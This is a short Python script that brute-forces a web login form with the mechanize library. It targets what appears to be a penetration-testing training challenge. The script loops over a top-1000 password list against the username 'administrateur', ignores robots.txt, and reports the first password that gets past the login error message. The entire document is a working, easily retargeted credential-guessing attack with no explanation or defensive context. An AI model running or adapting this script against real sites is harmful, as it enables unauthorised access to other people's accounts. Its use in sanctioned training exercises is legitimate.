#!/usr/bin/env python
# encoding: utf-8

import mechanize        
import time
br = mechanize.Browser()

br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

i = 0
with open("richelieu/top1000.txt") as infile:
    for passw in infile:
        passw = passw.rstrip()
        print("ATTEMPT", i, passw)
        r = br.open('http://pentest-isima.fr/Epreuves_Web/epreuve5/index.php?page=5')
        html = r.read()
        br.select_form("ident")
        br.form['login'] = "administrateur"
        br.form['passwd'] = passw
        br.submit()
        resp = br.response().read()
        string_element = resp.decode('UTF-8')

        if resp.find(b"Erreur d'identification") == -1:
                print ("Found Password: %s", passw)
                exit(0)
        i = i +1
exit(1)